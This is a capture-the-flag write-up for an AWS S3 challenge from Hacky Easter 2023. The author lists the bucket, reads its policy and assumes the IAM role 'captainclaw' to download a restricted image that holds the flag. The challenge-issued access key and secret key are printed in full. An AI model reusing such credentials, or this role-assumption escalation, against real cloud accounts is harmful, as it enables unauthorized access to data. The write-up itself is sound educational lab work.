# Description

# Cats in the Bucket

There is a bucket full of cat images. One of them contains a flag. Go get it!

 - Bucket: `cats-in-a-bucket`
 - Access Key ID: `AKIATZ2X44NMCEQW46PL`
 - Secret Access Key: `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`

## Hints

What exactly does the bucket allow?

# Solution

so this is for sure a aws s3 bucket challenge so lets see (i will probably need the cli to provide the keys given)

to go at it again, i looked at my writeups for last years s3 challenges

jeah so the url to it is:

<https://cats-in-a-bucket.s3.amazonaws.com/>

but using the browser as last time just gave me an access denied... so well cli it is now

remembering from an old hackvent challenge i created a new profile in `~/.aws/credentials` with the keys i got:

```
[Hacky-Easter-2023-cats-bucket]
aws_access_key_id = AKIATZ2X44NMCEQW46PL
aws_secret_access_key = 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
```

then i used the cli like this:

```
$ aws s3 ls s3://cats-in-a-bucket --profile Hacky-Easter-2023-cats-bucket
2022-10-09 17:23:46      83709 cat1.jpg
2022-10-09 17:23:48      92350 cat2.jpg
2022-10-09 17:23:47     119214 cat3.jpg
2022-10-09 17:23:47      87112 cat4.jpg
```

looks like it is working!!

coping the pictures one by one because all at once was not working...

```
$ aws s3 cp s3://cats-in-a-bucket/cat1.jpg bucket_contents/ --profile Hacky-Easter-2023-cats-bucket
download: s3://cats-in-a-bucket/cat1.jpg to bucket_contents/cat1.jpg
$ aws s3 cp s3://cats-in-a-bucket/cat2.jpg bucket_contents/ --profile Hacky-Easter-2023-cats-bucket
download: s3://cats-in-a-bucket/cat2.jpg to bucket_contents/cat2.jpg
$ aws s3 cp s3://cats-in-a-bucket/cat3.jpg bucket_contents/ --profile Hacky-Easter-2023-cats-bucket
download: s3://cats-in-a-bucket/cat3.jpg to bucket_contents/cat3.jpg
$ aws s3 cp s3://cats-in-a-bucket/cat4.jpg bucket_contents/ --profile Hacky-Easter-2023-cats-bucket
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

hmm so i am not allowed to download the 4th cat picture...

maybe there is a history or something? or other versions

helping links:

<https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html>

<https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-apicommands.html>

<https://docs.aws.amazon.com/AmazonS3/latest/userguide/list-obj-version-enabled-bucket.html>

well i have no permission to view a history or versions

<https://docs.aws.amazon.com/AmazonS3/latest/userguide/list-obj-version-enabled-bucket.html>

so well looking at the pictures i saw that cat3 is off a bit:

```
$ exiftool cat3.jpg 
ExifTool Version Number         : 12.57
File Name                       : cat3.jpg
Directory                       : .
File Size                       : 119 kB
File Modification Date/Time     : 2022:10:09 17:23:47+02:00
File Access Date/Time           : 2023:04:07 20:53:33+02:00
File Inode Change Date/Time     : 2023:04:07 20:52:08+02:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Exif Byte Order                 : Big-endian (Motorola, MM)
Orientation                     : Horizontal (normal)
X Resolution                    : 144
Y Resolution                    : 144
Resolution Unit                 : inches
User Comment                    : Screenshot
Exif Image Width                : 720
Exif Image Height               : 480
XMP Toolkit                     : XMP Core 6.0.0
Current IPTC Digest             : d41d8cd98f00b204e9800998ecf8427e
IPTC Digest                     : d41d8cd98f00b204e9800998ecf8427e
Profile CMM Type                : Apple Computer Inc.
Profile Version                 : 2.1.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2022:08:21 17:36:50
Profile File Signature          : acsp
Primary Platform                : Apple Computer Inc.
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : Apple Computer Inc.
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Apple Computer Inc.
Profile ID                      : 0
Profile Description             : Display
Profile Description ML (hr-HR)  : LCD u boji
Profile Description ML (ko-KR)  : 컬러 LCD
Profile Description ML (nb-NO)  : Farge-LCD
Profile Description ML (hu-HU)  : Színes LCD
Profile Description ML (cs-CZ)  : Barevný LCD
Profile Description ML (da-DK)  : LCD-farveskærm
Profile Description ML (nl-NL)  : Kleuren-LCD
Profile Description ML (fi-FI)  : Väri-LCD
Profile Description ML (it-IT)  : LCD a colori
Profile Description ML (es-ES)  : LCD a color
Profile Description ML (ro-RO)  : LCD color
Profile Description ML (fr-CA)  : ACL couleur
Profile Description ML (uk-UA)  : Кольоровий LCD
Profile Description ML (he-IL)  : LCD צבעוני
Profile Description ML (zh-TW)  : 彩色LCD
Profile Description ML (vi-VN)  : LCD Màu
Profile Description ML (sk-SK)  : Farebný LCD
Profile Description ML (zh-CN)  : 彩色LCD
Profile Description ML (ru-RU)  : Цветной ЖК-дисплей
Profile Description ML (en-GB)  : Colour LCD
Profile Description ML (fr-FR)  : LCD couleur
Profile Description ML (hi-IN)  : रगन LCD
Profile Description ML (th-TH)  : LCD ส
Profile Description ML (ca-ES)  : LCD en color
Profile Description ML (en-AU)  : Colour LCD
Profile Description ML (es-XL)  : LCD color
Profile Description ML (de-DE)  : Farb-LCD
Profile Description ML          : Color LCD
Profile Description ML (pt-BR)  : LCD Colorido
Profile Description ML (pl-PL)  : Kolor LCD
Profile Description ML (el-GR)  : Έγχρωμη οθόνη LCD
Profile Description ML (sv-SE)  : Färg-LCD
Profile Description ML (tr-TR)  : Renkli LCD
Profile Description ML (pt-PT)  : LCD a cores
Profile Description ML (ja-JP)  : カラーLCD
Profile Copyright               : Copyright Apple Inc., 2022
Media White Point               : 0.94955 1 1.08902
Red Matrix Column               : 0.51256 0.2403 -0.00104
Green Matrix Column             : 0.29549 0.70058 0.0423
Blue Matrix Column              : 0.15614 0.05913 0.78366
Red Tone Reproduction Curve     : (Binary data 2060 bytes, use -b option to extract)
Video Card Gamma                : (Binary data 48 bytes, use -b option to extract)
Native Display Info             : (Binary data 62 bytes, use -b option to extract)
Make And Model                  : (Binary data 40 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 2060 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 2060 bytes, use -b option to extract)
Image Width                     : 720
Image Height                    : 480
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 720x480
Megapixels                      : 0.346
```

this way i found out my username:

```
$ aws sts get-access-key-info --access-key-id AKIATZ2X44NMCEQW46PL --profile Hacky-Easter-2023-cats-bucket

An error occurred (AccessDenied) when calling the GetAccessKeyInfo operation: User: arn:aws:iam::261640479576:user/misterbuttons is not authorized to perform: sts:GetAccessKeyInfo because no identity-based policy allows the sts:GetAccessKeyInfo action
```

not allowed to see the bucket acl...

```
$ aws s3api get-bucket-acl --bucket cats-in-a-bucket --profile Hacky-Easter-2023-cats-bucket          

An error occurred (AccessDenied) when calling the GetBucketAcl operation: Access Denied
```
but i am allowed to see the policy!

```
$ aws s3api get-bucket-policy --bucket cats-in-a-bucket --profile Hacky-Easter-2023-cats-bucket
{
    "Policy": "{\"Version\":\"2008-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::261640479576:user/misterbuttons\"},\"Action\":[\"s3:ListBucket\",\"s3:GetBucketPolicy\"],\"Resource\":\"arn:aws:s3:::cats-in-a-bucket\"},{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::261640479576:user/misterbuttons\"},\"Action\":\"s3:GetObject\",\"Resource\":[\"arn:aws:s3:::cats-in-a-bucket/cat1.jpg\",\"arn:aws:s3:::cats-in-a-bucket/cat2.jpg\",\"arn:aws:s3:::cats-in-a-bucket/cat3.jpg\"]},{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::261640479576:role/captainclaw\"},\"Action\":\"s3:ListBucket\",\"Resource\":\"arn:aws:s3:::cats-in-a-bucket\"},{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::261640479576:role/captainclaw\"},\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::cats-in-a-bucket/cat4.jpg\"}]}"
}
```

this means i (misterbuttons) am not allowed to view cat4.jpg but with the role `captainclaw` i would be allowed...
so how do i get this role?!

well i am not allowed to see the policy for this role... so what should i do?

```
$ aws iam list-role-policies --role-name captainclaw --profile Hacky-Easter-2023-cats-bucket

An error occurred (AccessDenied) when calling the ListRolePolicies operation: User: arn:aws:iam::261640479576:user/misterbuttons is not authorized to perform: iam:ListRolePolicies on resource: role captainclaw because no identity-based policy allows the iam:ListRolePolicies action
```

i am also not allowed to see the user policy for myself...

```
$ aws iam list-user-policies --user-name misterbuttons --profile Hacky-Easter-2023-cats-bucket

An error occurred (AccessDenied) when calling the ListUserPolicies operation: User: arn:aws:iam::261640479576:user/misterbuttons is not authorized to perform: iam:ListUserPolicies on resource: user misterbuttons because no identity-based policy allows the iam:ListUserPolicies action
```

so i found this:

<https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_switch-role-cli.html>

and tried it in my credentials file:

```
[Hacky-Easter-2023-cats-bucket]
aws_access_key_id = AKIATZ2X44NMCEQW46PL
aws_secret_access_key = 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

[Hacky-Easter-2023-cats-captain]
role_arn = arn:aws:iam::261640479576:role/captainclaw
source_profile = Hacky-Easter-2023-cats-bucket
```

this looks really good, didnt think it will work!

```
$ aws s3 cp s3://cats-in-a-bucket/cat4.jpg bucket_contents/ --profile Hacky-Easter-2023-cats-captain
download: s3://cats-in-a-bucket/cat4.jpg to bucket_contents/cat4.jpg
```

jeah this picture has a flag in it!

# FLAG: he2023{r0l3_assum3d_succ3ssfuLLy}
